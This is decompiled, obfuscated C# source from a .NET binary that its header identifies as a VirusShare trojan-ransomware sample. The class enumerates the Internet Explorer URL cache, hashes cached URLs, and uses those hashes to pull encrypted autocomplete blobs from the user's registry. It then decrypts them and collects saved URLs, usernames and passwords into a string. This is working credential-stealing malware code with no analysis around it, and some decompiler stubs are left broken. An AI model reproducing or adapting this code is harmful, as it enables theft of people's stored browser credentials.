// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using \u0006;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;

namespace \u000E
{
  internal class \u0004
  {
    public static string \u0001;
    public static readonly uint \u0002;
    public static readonly uint \u0003;
    public static readonly uint \u0004;
    public static readonly uint \u0005;
    public static string \u0006;
    public static string \u0007;
    [NonSerialized]
    internal static \u0005 \u008C;

    static \u0004()
    {
      \u0002.\u0001(typeof (\u000E.\u0004));
      \u000E.\u0004.\u0002 = 32771U;
      \u000E.\u0004.\u0003 = 26113U;
      \u000E.\u0004.\u0004 = 26114U;
      \u000E.\u0004.\u0005 = 26625U;
      \u000E.\u0004.\u0006 = \u0001.\u0001(\u000E.\u0004.\u008C(8406), \u000E.\u0004.\u008C(395));
      \u000E.\u0004.\u0007 = \u000E.\u0004.\u008C(337);
    }

    [DllImport("advapi32.dll", EntryPoint = "CryptAcquireContext")]
    public static extern bool \u0001(
      [In] ref IntPtr obj0,
      [In] string obj1,
      [In] string obj2,
      [In] uint obj3,
      [In] uint obj4);

    public static bool \u0001([In] IntPtr obj0, [In] int obj1, [In] byte[] obj2, [In] ref int obj3, [In] int obj4)
    {
      bool flag;
      return flag;
    }

    [DllImport("advapi32.dll", EntryPoint = "CryptReleaseContext")]
    public static extern bool \u0001([In] IntPtr obj0, [In] uint obj1);

    [DllImport("advapi32.dll", EntryPoint = "CryptCreateHash")]
    public static extern bool \u0001(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] IntPtr obj2,
      [In] uint obj3,
      [In] ref IntPtr obj4);

    [DllImport("advapi32.dll", EntryPoint = "CryptHashData")]
    public static extern bool \u0001([In] IntPtr obj0, [In] IntPtr obj1, [In] int obj2, [In] uint obj3);

    [DllImport("advapi32.dll", EntryPoint = "CryptDestroyHash")]
    public static extern bool \u0001([In] IntPtr obj0);

    [DllImport("wininet.dll", EntryPoint = "FindFirstUrlCacheEntry", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr \u0001([MarshalAs(UnmanagedType.LPTStr)] string _param0, IntPtr _param1, ref int _param2);

    [DllImport("wininet.dll", EntryPoint = "FindNextUrlCacheEntry", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool \u0001([In] IntPtr obj0, [In] IntPtr obj1, [In] ref int obj2);

    public static bool \u0001(
      [In] ref \u000E.\u0004.\u0004 obj0,
      [In] int obj1,
      [In] ref \u000E.\u0004.\u0004 obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] ref \u000E.\u0004.\u0004 obj6)
    {
      bool flag;
      return flag;
    }

    public static void \u0001()
    {
      if ((object) \u008F\u0002.\u007E\u008E\u0003((object) Registry.CurrentUser, \u000E.\u0004.\u0006, true) == null)
      {
        string[] strArray = new string[7]
        {
          \u0001.\u0001(\u000E.\u0004.\u008C(8515), \u000E.\u0004.\u008C(395)),
          \u008B.\u001A\u0002(),
          \u008B.\u001A\u0002(),
          \u0001.\u0001(\u000E.\u0004.\u008C(8645), \u000E.\u0004.\u008C(395)),
          \u008B.\u001A\u0002(),
          \u008B.\u001A\u0002(),
          \u0001.\u0001(\u000E.\u0004.\u008C(8678), \u000E.\u0004.\u008C(395))
        };
        \u000E.\u0004.\u0001 = \u008D.\u001C\u0002(strArray);
      }
      else
      {
        int num1 = 2;
        int num2 = 0;
        \u000E.\u0004.\u0001((string) null, IntPtr.Zero, ref num2);
        if (\u0090\u0002.\u008F\u0003() == 259)
          return;
        int num3 = num2;
        IntPtr num4 = \u0087\u0002.\u0083\u0003(num3);
        try
        {
          IntPtr num5 = \u000E.\u0004.\u0001((string) null, num4, ref num2);
          bool flag;
          do
          {
            // ISSUE: type reference
            string str1 = ((\u000E.\u0004.\u0003) \u0091\u0002.\u0091\u0003(num4, \u000F\u0002.\u0001\u0003(__typeref (\u000E.\u0004.\u0003)))).\u0002;
            string str2 = global::\u0004.\u007E\u0012((object) str1);
            string str3 = \u0083\u0002.\u007E\u001F\u0003((object) str2, checked (\u0082\u0002.\u007E\u001E\u0003((object) str2, \u0001.\u0001(\u000E.\u0004.\u008C(8820), \u000E.\u0004.\u008C(395))) + 1));
            if (\u0082\u0002.\u007E\u001E\u0003((object) str3, \u0001.\u0001(\u000E.\u0004.\u008C(8829), \u000E.\u0004.\u008C(395))) > 0)
              str3 = \u0017\u0002.\u007E\u000E\u0003((object) str3, 0, \u0082\u0002.\u007E\u001E\u0003((object) str3, \u0001.\u0001(\u000E.\u0004.\u008C(8829), \u000E.\u0004.\u008C(395))));
            string str4 = \u000E.\u0004.\u0001(str3, checked (\u0003.\u007E\u0004((object) str3) + 1 * 2));
            try
            {
              byte[] numArray1 = (byte[]) \u0093\u0002.\u007E\u0093\u0003((object) \u0092\u0002.\u007E\u0092\u0003((object) Registry.CurrentUser, \u000E.\u0004.\u0006), str4, (object) null);
              if (numArray1 != null)
              {
                if (!\u0094.\u007E\u0082\u0002((object) \u000E.\u0004.\u0007, str3))
                {
                  \u000E.\u0004.\u0001(str3, str4, numArray1.Length, numArray1);
                  \u000E.\u0004.\u0007 = \u0095.\u0083\u0002(\u000E.\u0004.\u0007, str3, \u0001.\u0001(\u000E.\u0004.\u008C(8838), \u000E.\u0004.\u008C(395)));
                }
              }
              else
              {
                string str5 = \u0011.\u0081(str3, \u0001.\u0001(\u000E.\u0004.\u008C(8847), \u000E.\u0004.\u008C(395)));
                string str6 = \u000E.\u0004.\u0001(str5, checked (\u0003.\u007E\u0004((object) str5) + 1 * 2));
                byte[] numArray2 = (byte[]) \u0093\u0002.\u007E\u0093\u0003((object) \u0092\u0002.\u007E\u0092\u0003((object) Registry.CurrentUser, \u000E.\u0004.\u0006), str6, (object) null);
                if (numArray2 != null)
                {
                  if (!\u0094.\u007E\u0082\u0002((object) \u000E.\u0004.\u0007, str5))
                  {
                    \u000E.\u0004.\u0001(str5, str6, numArray2.Length, numArray2);
                    \u000E.\u0004.\u0007 = \u0095.\u0083\u0002(\u000E.\u0004.\u0007, str5, \u000E.\u0004.\u008C(7084));
                  }
                }
              }
            }
            catch (Exception ex)
            {
              int lErl = num1;
              ProjectData.SetProjectError(ex, lErl);
              string[] strArray = new string[7]
              {
                \u0001.\u0001(\u000E.\u0004.\u008C(8515), \u000E.\u0004.\u008C(395)),
                \u008B.\u001A\u0002(),
                \u008B.\u001A\u0002(),
                \u0001.\u0001(\u000E.\u0004.\u008C(8645), \u000E.\u0004.\u008C(395)),
                \u008B.\u001A\u0002(),
                \u008B.\u001A\u0002(),
                \u0001.\u0001(\u000E.\u0004.\u008C(8678), \u000E.\u0004.\u008C(395))
              };
              \u000E.\u0004.\u0001 = \u008D.\u001C\u0002(strArray);
              \u000F.\u001D();
              break;
            }
            num2 = num3;
            flag = \u000E.\u0004.\u0001(num5, num4, ref num2);
            if ((flag || \u0090\u0002.\u008F\u0003() != 259) && !flag && num2 > num3)
            {
              num3 = num2;
              IntPtr num6 = new IntPtr(num3);
              num4 = \u0094\u0002.\u0094\u0003(num4, num6);
              flag = true;
            }
          }
          while (flag);
        }
        finally
        {
          \u0095\u0002.\u0095\u0003(num4);
        }
      }
    }

    public static string \u0001([In] string obj0, [In] int obj1)
    {
      string str1;
      try
      {
        byte[] numArray = new byte[21];
        string str2 = \u000E.\u0004.\u008C(337);
        int num1 = 20;
        IntPtr num2;
        \u000E.\u0004.\u0001(ref num2, (string) null, (string) null, 1U, 0U);
        IntPtr num3;
        \u000E.\u0004.\u0001(num2, 32772U, IntPtr.Zero, 0U, ref num3);
        \u000E.\u0004.\u0001(num3, \u000E.\u0004.\u0001((object) obj0), obj1, 0U);
        \u000E.\u0004.\u0001(num3, 2, numArray, ref num1, 0);
        \u000E.\u0004.\u0001(num3);
        \u000E.\u0004.\u0001(num2, 0U);
        int index = 0;
        while (index < 20)
        {
          str2 = \u0011.\u0081(str2, \u0096\u0002.\u0096\u0003(\u0011.\u0081(\u0001.\u0001(\u000E.\u0004.\u008C(8856), \u000E.\u0004.\u008C(395)), numArray[index].ToString(\u0001.\u0001(\u000E.\u0004.\u008C(8865), \u000E.\u0004.\u008C(395)))), 2));
          int num4 = \u0098\u0002.\u0099\u0003(\u0097\u0002.\u0098\u0003(ref index), checked (index - 1));
        }
        str1 = \u0011.\u0081(str2, \u0096\u0002.\u0096\u0003(\u0011.\u0081(\u0001.\u0001(\u000E.\u0004.\u008C(8856), \u000E.\u0004.\u008C(395)), \u000E.\u0004.\u0001(str2).ToString(\u0001.\u0001(\u000E.\u0004.\u008C(8865), \u000E.\u0004.\u008C(395)))), 2));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      return str1;
    }

    public static byte \u0001([In] string obj0)
    {
      byte num1;
      try
      {
        int num2 = 0;
        int num3 = 1;
        while (num3 < \u0003.\u007E\u0004((object) obj0))
        {
          if (num3 % 2 != 0)
            checked { num2 += \u009B\u0002.\u009C\u0003(\u009A\u0002.\u009B\u0003(\u0011.\u0081(\u0001.\u0001(\u000E.\u0004.\u008C(8874), \u000E.\u0004.\u008C(395)), \u0099\u0002.\u009A\u0003(obj0, num3, 2)))); }
          int num4 = \u0098\u0002.\u0099\u0003(\u0097\u0002.\u0098\u0003(ref num3), checked (num3 - 1));
        }
        num1 = \u0007\u0002.\u009D\u0002(num2 % 256);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      return num1;
    }

    public static void \u0001([In] string obj0, [In] string obj1, [In] int obj2, [In] byte[] obj3)
    {
      \u000E.\u0004.\u0004 obj4 = new \u000E.\u0004.\u0004();
      \u000E.\u0004.\u0004 obj5 = new \u000E.\u0004.\u0004();
      \u000E.\u0004.\u0004 obj6 = new \u000E.\u0004.\u0004();
      \u000E.\u0004.\u0001 obj7 = new \u000E.\u0004.\u0001();
      \u000E.\u0004.\u0002 obj8 = new \u000E.\u0004.\u0002();
      IntPtr num1 = \u0087\u0002.\u0083\u0003(obj2);
      try
      {
        \u009C\u0002.\u009D\u0003(obj3, 0, num1, obj2);
        obj4.\u0001 = obj2;
        obj4.\u0002 = num1;
        obj6.\u0001 = checked (\u0003.\u007E\u0004((object) obj0) + 1 * 2);
        obj6.\u0002 = \u000E.\u0004.\u0001((object) obj0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      try
      {
        if (!\u000E.\u0004.\u0001(ref obj4, 0, ref obj6, 0, 0, 0, ref obj5))
          return;
        IntPtr num2 = new IntPtr(checked (obj5.\u0002.ToInt32() + (int) \u009D\u0002.\u009E\u0003(obj5.\u0002)));
        \u000E.\u0004.\u0001 obj9 = (\u000E.\u0004.\u0001) \u0091\u0002.\u0091\u0003(num2, \u009E\u0002.\u007E\u009F\u0003((object) obj7));
        if (obj9.\u0005 != 1 || obj9.\u0003 < 2)
          return;
        IntPtr num3 = new IntPtr(checked (num2.ToInt32() + obj9.\u0002));
        IntPtr num4 = new IntPtr(checked (num3.ToInt32() + (obj9.\u0003 + 0) * \u009F\u0002.\u0001\u0004((object) obj8)));
        int num5 = 0;
        \u000E.\u0004.\u0001 = \u008C.\u001B\u0002(\u000E.\u0004.\u0001, \u0001.\u0001(\u000E.\u0004.\u008C(8883), \u000E.\u0004.\u008C(395)), \u008B.\u001A\u0002(), \u008B.\u001A\u0002());
        while ((double) num5 < (double) obj9.\u0003 / 2.0)
        {
          if (num5 != 0)
            num3 = new IntPtr(checked (num3.ToInt32() + \u009F\u0002.\u0001\u0004((object) obj8)));
          obj8 = (\u000E.\u0004.\u0002) \u0091\u0002.\u0091\u0003(num3, \u009E\u0002.\u007E\u009F\u0003((object) obj8));
          IntPtr num6 = new IntPtr(checked (num4.ToInt32() + obj8.\u0001));
          string str1 = \u0001\u0003.\u0003\u0004(num6);
          num3 = new IntPtr(checked (num3.ToInt32() + \u009F\u0002.\u0001\u0004((object) obj8)));
          obj8 = (\u000E.\u0004.\u0002) \u0091\u0002.\u0091\u0003(num3, \u009E\u0002.\u007E\u009F\u0003((object) obj8));
          num6 = new IntPtr(checked (num4.ToInt32() + obj8.\u0001));
          string str2 = \u0001\u0003.\u0003\u0004(num6);
          \u000E.\u0004.\u0001 = \u008C.\u001B\u0002(\u000E.\u0004.\u0001, \u0001.\u0001(\u000E.\u0004.\u008C(8964), \u000E.\u0004.\u008C(395)), obj0, \u008B.\u001A\u0002());
          \u000E.\u0004.\u0001 = \u008C.\u001B\u0002(\u000E.\u0004.\u0001, \u0001.\u0001(\u000E.\u0004.\u008C(8977), \u000E.\u0004.\u008C(395)), str1, \u008B.\u001A\u0002());
          \u000E.\u0004.\u0001 = \u008C.\u001B\u0002(\u000E.\u0004.\u0001, \u0001.\u0001(\u000E.\u0004.\u008C(9002), \u000E.\u0004.\u008C(395)), str2, \u008B.\u001A\u0002());
          \u000E.\u0004.\u0001 = \u0011.\u0081(\u000E.\u0004.\u0001, \u008B.\u001A\u0002());
          int num7 = \u0098\u0002.\u0099\u0003(\u0097\u0002.\u0098\u0003(ref num5), checked (num5 - 1));
        }
        \u000E.\u0004.\u0001 = \u0011.\u0081(\u000E.\u0004.\u0001, \u0001.\u0001(\u000E.\u0004.\u008C(9027), \u000E.\u0004.\u008C(395)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
    }

    public static IntPtr \u0001([In] object obj0)
    {
      IntPtr num;
      try
      {
        num = \u0015\u0002.\u0007\u0003(\u0001.\u0001(obj0), GCHandleType.Pinned).AddrOfPinnedObject();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      return num;
    }

    public struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
    }

    public struct \u0002
    {
      public int \u0001;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0002;
      public int \u0003;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct \u0003
    {
      public int \u0001;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string \u0002;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
      public int \u0007;
      public int \u0008;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u000E;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u000F;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0010;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0011;
      public IntPtr \u0012;
      public int \u0013;
      public IntPtr \u0014;
      public int \u0015;
    }

    public struct \u0004
    {
      public int \u0001;
      public IntPtr \u0002;
    }
  }
}
